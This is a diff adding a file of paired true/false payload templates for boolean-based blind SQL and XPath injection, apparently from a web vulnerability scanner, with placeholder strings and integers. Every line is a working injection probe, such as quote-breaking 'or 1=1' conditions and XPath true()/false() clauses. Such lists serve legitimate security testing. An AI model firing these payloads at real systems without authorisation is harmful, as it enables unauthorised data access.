@@ -1,0 +1,22 @@
+.[true()]/{random:str1}§§§§.[false()]/{random:str1}
+{random:int1}={random:int1} and {random:str1}§§§§{random:int1}={random:int2} and {random:str1}
+{random:str1} and not {random:int1}={random:int2} and {random:str1}§§§§{random:str1} and {random:int1}={random:int2} and {random:str1}
+{random:str1} and {random:int1}={random:int1}§§§§{random:str1} and {random:int1}={random:int2}
+{random:str1}" and "{random:int1}"="{random:int1}§§§§{random:str1}" and "{random:int1}"="{random:int2}
+{random:str1}") and false()] | //*[true() and string("{random:int1}"="{random:int1}§§§§{random:str1}") and false()] | //*[false() and string("{random:int1}"="{random:int1}
+{random:str1}") and true() and string("{random:int1}"="{random:int1}§§§§{random:str1}") and false() and string("{random:int1}"="{random:int1}
+{random:str1}"§§§§{random:str1}""
+{random:str1}%00'§§§§{random:str1}'%00'
+{random:str1}%27§§§§{random:str1}%27%27
+{random:str1}' and '{random:int1}'='{random:int1}§§§§{random:str1}' and '{random:int1}'='{random:int2}
+{random:str1}' and {random:int1}={random:int1}-- §§§§{random:str1}' and {random:int1}={random:int1}'--
+{random:str1}' and {random:int1}={random:int1}-- §§§§{random:str1}' and {random:int1}={random:int2}-- 
+{random:str1}' or '{random:int1}'='{random:int1}' or '{random:int1}'='{random:int2}§§§§{random:str1}' or '{random:int1}'='{random:int2}' or '{random:int1}'='{random:int2}
+{random:str1}' or '{random:int1}'='{random:int1}§§§§{random:str1}' or '{random:int1}'='{random:int1}'
+{random:str1}' or '{random:int1}'='{random:int1}§§§§{random:str1}' or '{random:int1}'='{random:int2}
+{random:str1}' or true() or '{random:str1}§§§§{random:str1}' or false() or '{random:str1}
+{random:str1}' or {random:int1}={random:int1}-- §§§§{random:str1}' or {random:int1}={random:int2}-- 
+{random:str1}') and true() and string('{random:int1}'='{random:int1}§§§§{random:str1}') and false() and string('{random:int1}'='{random:int1}
+{random:str1}'§§§§{random:str1}''
+{random:str1}=§§§§{random:str1}==
+{random:str1}[true()]§§§§{random:str1}[false()]
